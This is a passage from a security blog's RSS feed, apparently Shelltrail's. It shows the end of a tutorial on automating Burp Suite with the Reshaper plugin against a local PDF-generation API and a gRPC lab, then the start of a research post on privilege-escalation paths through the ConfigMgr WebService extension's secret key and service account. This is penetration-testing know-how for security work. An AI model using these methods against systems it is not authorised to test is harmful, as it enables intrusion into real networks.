&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ curl -X POST http://localhost:3000/insert \
  -H &amp;#39;Content-Type: text/html&amp;#39; \
  -H &amp;#39;API-Key: 1d8e71ab-8e46-47aa-b25c-a3c8c83b0360&amp;#39; \
  -d &amp;#39;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Hello, World!&amp;lt;/h1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;#39;

{&amp;#34;uuid&amp;#34;:&amp;#34;5d164279-4515-4db6-b620-976c2b56431d&amp;#34;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Generating the PDF:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ curl http://localhost:3000/generate/5d164279-4515-4db6-b620-976c2b56431d   -H &amp;#39;API-Key: 1d8e71ab-8e46-47aa-b25c-a3c8c83b0360&amp;#39;   -o output.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 14408  100 14408    0     0   9232      0  0:00:01  0:00:01 --:--:--  9229

$ file output.pdf 
output.pdf: PDF document, version 1.4, 1 page(s)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great success. Everything seems to work as expected.&lt;/p&gt;
&lt;p&gt;Lets plan our setup:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Set the API key named &lt;code&gt;api_key&lt;/code&gt; as variable in Reshaper&lt;/li&gt;
&lt;li&gt;Create a &lt;em&gt;Whens&lt;/em&gt; action to trigger on POST to &lt;code&gt;/input&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Store the UUID in a variable named &lt;code&gt;uuid&lt;/code&gt; returned from the &lt;code&gt;/input&lt;/code&gt; action.&lt;/li&gt;
&lt;li&gt;Build a HTTP GET request which uses the UUID variable and API key to generate the PDF&lt;/li&gt;
&lt;li&gt;Send the crafted HTTP request&lt;/li&gt;
&lt;li&gt;Save the generate PDF to disk&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Task 1 - Set the API key named &lt;code&gt;api_key&lt;/code&gt; as variable in Reshaper:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-creating-a-static-variable.png&#34; alt=&#34;reshaper-creating-a-static-variable&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Task 2 - Create a &lt;em&gt;Whens&lt;/em&gt; action to trigger on POST to &lt;code&gt;/input&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Match Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Response&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Matches Text&lt;/td&gt;
&lt;td&gt;Request Status Line&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Equals&lt;/td&gt;
&lt;td&gt;POST /insert HTTP/1.1&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;(Note: The Request direction shall be Response even though our POST action is
a Request.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Task 3 - Store the returned UUID in a variable named &lt;code&gt;uuid&lt;/code&gt; from the &lt;code&gt;/input&lt;/code&gt;
endpoint:&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Variable&lt;/td&gt;
&lt;td&gt;Response Body&lt;/td&gt;
&lt;td&gt;JSON&lt;/td&gt;
&lt;td&gt;uuid&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;uuid&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;Task 4 - Build a HTTP GET request which uses the UUID variable and API key to generate the PDF:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now we need to use a new action type called &lt;em&gt;Build HTTP Message&lt;/em&gt;.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Event Direction&lt;/th&gt;
&lt;th&gt;Starter HTTP message&lt;/th&gt;
&lt;th&gt;Setter (1) - Source Text&lt;/th&gt;
&lt;th&gt;Destination Message Value&lt;/th&gt;
&lt;th&gt;Destination Identifier Placement&lt;/th&gt;
&lt;th&gt;Setter (2)&lt;/th&gt;
&lt;th&gt;Source Text&lt;/th&gt;
&lt;th&gt;Destination Message Value&lt;/th&gt;
&lt;th&gt;Destination Identifier&lt;/th&gt;
&lt;th&gt;Destination Identifier Placement&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Build HTTP Message&lt;/td&gt;
&lt;td&gt;Request&lt;/td&gt;
&lt;td&gt;GET /generate/{{g:uuid}} HTTP/1.1&lt;/td&gt;
&lt;td&gt;{{g:api_key}}&lt;/td&gt;
&lt;td&gt;Request Header&lt;/td&gt;
&lt;td&gt;API-Key&lt;/td&gt;
&lt;td&gt;Only&lt;/td&gt;
&lt;td&gt;localhost:3000&lt;/td&gt;
&lt;td&gt;Request Header&lt;/td&gt;
&lt;td&gt;Host&lt;/td&gt;
&lt;td&gt;Only&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;http_message&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Now this is really cool. If we trigger this Reshaper rule by sending a POST request to &lt;code&gt;/insert&lt;/code&gt; to get an UUID response, Reshaper crafts a fully functional HTTP request and store in a variable called &lt;code&gt;http_message&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-crafting-fully-working-http-request.png&#34; alt=&#34;reshaper-crafting-fully-working-http-request&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Task 5 - Send the crafted HTTP request:&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Request&lt;/th&gt;
&lt;th&gt;URL&lt;/th&gt;
&lt;th&gt;Protocol&lt;/th&gt;
&lt;th&gt;Address&lt;/th&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Wait for Completion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Send Request&lt;/td&gt;
&lt;td&gt;{{g:http_message}}&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Checked&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;Task 6 - Save the generate PDF to disk:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We store every PDF on disk because we want to manually inspect them to not miss
any potential vulnerabilities.&lt;/p&gt;
&lt;p&gt;To achieve this We create a new Reshaper HTTP rule that will match on the
HTTP response header &lt;code&gt;Content-Type: application/pdf&lt;/code&gt;:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Identifier&lt;/th&gt;
&lt;th&gt;Identifies Placement&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Match Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Response&lt;/td&gt;
&lt;td&gt;Matches Text&lt;/td&gt;
&lt;td&gt;Response Header&lt;/td&gt;
&lt;td&gt;Content-Type&lt;/td&gt;
&lt;td&gt;Last&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Equals&lt;/td&gt;
&lt;td&gt;application-pdf&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;We set the response body (a.k.a the PDF file) to a variable named &lt;code&gt;pdf&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Variable&lt;/td&gt;
&lt;td&gt;Response Body&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;pdf&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;And then save that variable to disk at the location &lt;code&gt;/tmp/pdf/&amp;lt;UUID&amp;gt;.pdf&lt;/code&gt;:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;File Path&lt;/th&gt;
&lt;th&gt;Text&lt;/th&gt;
&lt;th&gt;Encoding&lt;/th&gt;
&lt;th&gt;File Exist Action&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Save File&lt;/td&gt;
&lt;td&gt;/tmp/pdf/{{g:uuid}}.pdf&lt;/td&gt;
&lt;td&gt;{{g:pdf}}&lt;/td&gt;
&lt;td&gt;Default&lt;/td&gt;
&lt;td&gt;Overwrite&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;From now on every request that is sent to &lt;code&gt;/insert&lt;/code&gt; will save a PDF to the
&lt;code&gt;/tmp/pdf&lt;/code&gt; location where inspection of content can be made.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ file /tmp/pdf/*
/tmp/pdf/05b053d5-e232-449f-b2d2-0c4338d8a2f6.pdf: PDF document, version 1.4, 1 page(s)
/tmp/pdf/3e674c45-369e-4b04-8409-f90539a50eb3.pdf: PDF document, version 1.4, 1 page(s)
/tmp/pdf/7fb8bbc0-91fd-4141-ba2a-090419364e5d.pdf: PDF document, version 1.4, 1 page(s)
/tmp/pdf/812b488a-ecc1-4e8d-b8ef-b2dd105c181a.pdf: PDF document, version 1.4, 1 page(s)
/tmp/pdf/88ce6b32-26ca-46f8-ad43-e77a8f679098.pdf: PDF document, version 1.4, 1 page(s)
/tmp/pdf/c5c94988-d980-49d4-ba48-1d20ed5e877c.pdf: PDF document, version 1.4, 1 page(s)
/tmp/pdf/ec410dc7-6937-45bb-ba58-37ab85566297.pdf: PDF document, version 1.4, 1 page(s)
/tmp/pdf/f9c0101f-c510-49d6-be47-da2fb382206b.pdf: PDF document, version 1.4, 1 page(s)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;scenario-7---grpc-from-the-abyss&#34;&gt;Scenario 7 - gRPC from the abyss&lt;/h1&gt;
&lt;p&gt;gRPC is a tricky protocol which makes automatic scanning and testing hard as it is using protobuf
and serializes its messages. &lt;a href=&#34;https://github.com/nxenon/grpc-pentest-suite&#34;&gt;@nxenon&lt;/a&gt;
has performed in-depth research and provides tooling for encoding and decoding these
protobuf messages.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;ll build on top of that research and implement an automatic encoder that
can be used with Burps active scanner and repeater.&lt;/p&gt;
&lt;p&gt;Use nxenon&amp;rsquo;s &lt;a href=&#34;https://github.com/nxenon/grpc-lab/tree/main/examples/echo&#34;&gt;echo gRPC lab&lt;/a&gt;
to spin up an demo environment which will be used to demonstrate Reshapers
abilities.&lt;/p&gt;
&lt;p&gt;When the environment is live requests and responses will look like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;grpc-setup-working.png&#34; alt=&#34;grpc-setup-working&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lets configure our Reshaper HTTP rules as following:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Match Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Response&lt;/td&gt;
&lt;td&gt;Matches Text&lt;/td&gt;
&lt;td&gt;URL&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Equals&lt;/td&gt;
&lt;td&gt;http://localhost:8080/grpc.gateway.testing.EchoService/Echo&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;We&amp;rsquo;ll set the request body to a variable:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Variable&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;grpc&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;We once again use our base64 encoder technique to encode our data before
dropping it to our command-line tooling.&lt;/p&gt;
&lt;p&gt;Run Script:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var Base64 = {

    // private property
    _keyStr : &amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;,

    // public method for encoding
    encode : function (input) {
        var output = &amp;#34;&amp;#34;;
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;

        input = Base64._utf8_encode(input);

        while (i &amp;lt; input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 &amp;gt;&amp;gt; 2;
            enc2 = ((chr1 &amp;amp; 3) &amp;lt;&amp;lt; 4) | (chr2 &amp;gt;&amp;gt; 4);
            enc3 = ((chr2 &amp;amp; 15) &amp;lt;&amp;lt; 2) | (chr3 &amp;gt;&amp;gt; 6);
            enc4 = chr3 &amp;amp; 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
            this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
            this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
        }
        return output;
    },

    // public method for decoding
    decode : function (input) {
        var output = &amp;#34;&amp;#34;;
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, &amp;#34;&amp;#34;);

        while (i &amp;lt; input.length) {

            enc1 = this._keyStr.indexOf(input.charAt(i++));
            enc2 = this._keyStr.indexOf(input.charAt(i++));
            enc3 = this._keyStr.indexOf(input.charAt(i++));
            enc4 = this._keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 &amp;lt;&amp;lt; 2) | (enc2 &amp;gt;&amp;gt; 4);
            chr2 = ((enc2 &amp;amp; 15) &amp;lt;&amp;lt; 4) | (enc3 &amp;gt;&amp;gt; 2);
            chr3 = ((enc3 &amp;amp; 3) &amp;lt;&amp;lt; 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }

        output = Base64._utf8_decode(output);

        return output;
    },

    // private method for UTF-8 encoding
    _utf8_encode : function (string) {
        string = string.replace(/\r\n/g,&amp;#34;\n&amp;#34;);
        var utftext = &amp;#34;&amp;#34;;

        for (var n = 0; n &amp;lt; string.length; n++) {

            var c = string.charCodeAt(n);

            if (c &amp;lt; 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c &amp;gt; 127) &amp;amp;&amp;amp; (c &amp;lt; 2048)) {
                utftext += String.fromCharCode((c &amp;gt;&amp;gt; 6) | 192);
                utftext += String.fromCharCode((c &amp;amp; 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c &amp;gt;&amp;gt; 12) | 224);
                utftext += String.fromCharCode(((c &amp;gt;&amp;gt; 6) &amp;amp; 63) | 128);
                utftext += String.fromCharCode((c &amp;amp; 63) | 128);
            }
        }
        return utftext;
    },

    // private method for UTF-8 decoding
    _utf8_decode : function (utftext) {
        var string = &amp;#34;&amp;#34;;
        var i = 0;
        var c = c1 = c2 = 0;

        while ( i &amp;lt; utftext.length ) {

            c = utftext.charCodeAt(i);

            if (c &amp;lt; 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c &amp;gt; 191) &amp;amp;&amp;amp; (c &amp;lt; 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c &amp;amp; 31) &amp;lt;&amp;lt; 6) | (c2 &amp;amp; 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c &amp;amp; 15) &amp;lt;&amp;lt; 12) | ((c2 &amp;amp; 63) &amp;lt;&amp;lt; 6) | (c3 &amp;amp; 63));
                i += 3;
            }
        }
        return string;
    }
}

var snus = Base64.encode(Reshaper.variables.getGlobalVariable(&amp;#34;grpc&amp;#34;));

Reshaper.event.runThen(&amp;#34;SetVariable&amp;#34;,
{
    text: snus,
  useMessageValue: false,
    targetSource: &amp;#34;Global&amp;#34;,
    variableName: &amp;#34;grpc_base64&amp;#34;
}
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we send our payload stored in the &lt;code&gt;grpc_base64&lt;/code&gt; variable to nxenon&amp;rsquo;s
&lt;code&gt;grpc-coder.py&lt;/code&gt; tool:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Stdin&lt;/th&gt;
&lt;th&gt;Wait for completion&lt;/th&gt;
&lt;th&gt;Capture Output&lt;/th&gt;
&lt;th&gt;Capture Variable Name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Run Process&lt;/td&gt;
&lt;td&gt;echo $(echo {{g:grpc_base64}} | base64 -d) | protoscope -s | python3 /home/user/grpc-coder.py &amp;ndash;encode | tr -d &amp;lsquo;\n&amp;rsquo;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Checked&lt;/td&gt;
&lt;td&gt;Checked&lt;/td&gt;
&lt;td&gt;grpc_payload&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Next we replace our request body with the gRPC encoded payload:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Text&lt;/th&gt;
&lt;th&gt;Source Type Value&lt;/th&gt;
&lt;th&gt;Destination Message Value&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Value&lt;/td&gt;
&lt;td&gt;{{g:grpc_payload}}&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Awesome. Now we can grab a valid request that has been sent to the server,
use the &lt;code&gt;grpc-coder.py&lt;/code&gt; to decode the input, then we can use Burps active scanner
or manually customize the input as we please and all encoding will be
done automatically.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;grpc-reshaper-setup-working.png&#34; alt=&#34;grpc-reshaper-setup-working&#34;&gt;&lt;/p&gt;
&lt;p&gt;This will save us precious time when assessing gRPC Web applications.&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;Reshaper is an extremely powerful Burp plugin that helps you automate
complex flows or overcome hurdles when assessing advanced web applications.
It&amp;rsquo;s been a long way to reach the end of this research but if you are here
you most certainly learned a thing or two regarding the many possibilities
with Burp and Reshaper which may help you when pentesting web applications.&lt;/p&gt;
&lt;p&gt;All the code from all node.js applications can be found at Shelltrails
&lt;a href=&#34;https://github.com/shelltrail/tricky-apis&#34;&gt;github page&lt;/a&gt;,&lt;/p&gt;
&lt;p&gt;Take care and happy hacking!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Microsoft Configuration Manager - New attack paths using ConfigMgr WebService extension</title>
      <link>https://www.shelltrail.com/research/microsoft-endpoint-configuration-manager-webservices/</link>
      <pubDate>Tue, 10 Oct 2023 00:00:00 +0000</pubDate>
      
      <guid>https://www.shelltrail.com/research/microsoft-endpoint-configuration-manager-webservices/</guid>
      <description>&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://msendpointmgr.com/configmgr-webservice/&#34;&gt;ConfigMgr WebService&lt;/a&gt;, a third-party extension used to simplify custom Operating System Deployment (OSD) for
Microsoft Configuration
Manager adds features to interact with Configuration Manager, MDT and Active Directory which under
certain situations can be exploited to escalate privileges in an Active
Directory domain. While the extension is considered legacy by the developer, it may still be
prevalent in several environments.&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;As part of the research surrounding Microsoft Configuration Manager, Shelltrail has investigated a open source
third-party tool used in OS deployments which interacts with Configuration Manager, MDT and Active
Directory. The tool in question contains two parts, a WebService
endpoint called &lt;a href=&#34;https://msendpointmgr.com/configmgr-webservice/&#34;&gt;ConfigMgr WebService&lt;/a&gt; and a .NET GUI application named &lt;a href=&#34;https://msendpointmgr.com/configmgr-osd-frontend/&#34;&gt;ConfigMgr OSD FrontEnd&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The tools adds the functionality to create custom Operating System Deployment sequences
via &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; which exposes a GUI during Windows Preinstallation
Environment (WinPE) where a user or administrator can customize and define
the deployment process by means of using input and checkboxes.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-showing-osd-frontend-during-pentest.png&#34; alt=&#34;Image showing OSD FrontEnd during pentest&#34;&gt;&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; (&lt;code&gt;OSDFrontEnd.exe&lt;/code&gt;) self-service GUI simplifies
the customization process as the alternative would be for a Configuration manager
administrator to build, and deploy a custom Task Sequence which can be time consuming.&lt;/p&gt;
&lt;p&gt;Most options, configuration and ability to communicate with &lt;em&gt;ConfigMgr WebService&lt;/em&gt;
for &lt;code&gt;OSDFrontEnd.exe&lt;/code&gt; comes from &lt;code&gt;OSDFrontEnd.exe.config&lt;/code&gt;
which is provided in the OSDFrontEnd enabled WinPE PXE bootable image.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-showing-file-structure-on-a-security-assessment.png&#34; alt=&#34;Image showing file structure on a security assessment&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;configmgr-webservice-authentication&#34;&gt;ConfigMgr WebService authentication&lt;/h2&gt;
&lt;p&gt;As unauthenticated access to the &lt;em&gt;ConfigMgr WebService&lt;/em&gt; could have severe consequences, a basic
authentication mechanism is used, where a secret access key is generated upon installation of
the WebService. The access key is generated as an unguessable type-4 UUID and stored in the &lt;code&gt;web.config&lt;/code&gt;
file in the root of the IIS web application.&lt;/p&gt;
&lt;p&gt;Upon issuing requests to the WebService the &lt;code&gt;WebServiceSecret&lt;/code&gt; need to be supplied and if
it matches the configured key, the request is authorized. As the &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; need to
know this key in order to make use of the functionality, it is included in the &lt;code&gt;OSDFrontEnd.exe.config&lt;/code&gt;
file together with the endpoint with which to interact, as seen in the image below.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;web-config-during-active-directory-security-assessment.png&#34; alt=&#34;Image showing web.config during Active Directory security assessment&#34;&gt;&lt;/p&gt;
&lt;p&gt;By obtaining the &lt;code&gt;WebServiceSecretKey&lt;/code&gt;, communication can be established with the
&lt;em&gt;ConfigMgr WebService&lt;/em&gt;. From here on different exploitation paths may exist, depending on
how the service account is configured for the IIS AppPool running &lt;em&gt;ConfigMgr WebService&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;active-directory-attributes-during-internal-security-assessment.png&#34; alt=&#34;Image showing active directory attributes during internal security assessment&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;configmgr-webservice-permissions&#34;&gt;ConfigMgr WebService permissions&lt;/h2&gt;
&lt;p&gt;During the setup of &lt;em&gt;ConfigMgr WebService&lt;/em&gt; the service account used in IIS
is specified during the &lt;code&gt;Specify Application Pool Identity&lt;/code&gt; which can be seen
in &lt;code&gt;ConfigMgr WebService 1.8.0 - Installation Guide.pdf&lt;/code&gt; from &lt;a href=&#34;https://github.com/MSEndpointMgr/ConfigMgrWebService/releases&#34;&gt;ConfigMgr.WebService.1.8.0.zip&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;security-settings-service-account.png&#34; alt=&#34;Service account in Active Directory&#34;&gt;&lt;/p&gt;
&lt;p&gt;This service account, which this research essentially is all about, is the key
to keep the environment secure. If this service account is configured with higher
privileges than intended, it may lead to privilege escalations in various ways.&lt;/p&gt;
&lt;p&gt;The documentation for &lt;em&gt;ConfigMgr WebService&lt;/em&gt; regarding the service accounts&#39;
permissions can be found in three places&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ConfigMgr WebService 1.8.0 - Installation Guide.pdf - page 3
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;security-permissions-1.png&#34; alt=&#34;IT security permissions&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ConfigMgr OSD FrontEnd 1.6.0 - Documentation.pdf - page 35
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;security-permissions-2.png&#34; alt=&#34;IT security permissions&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
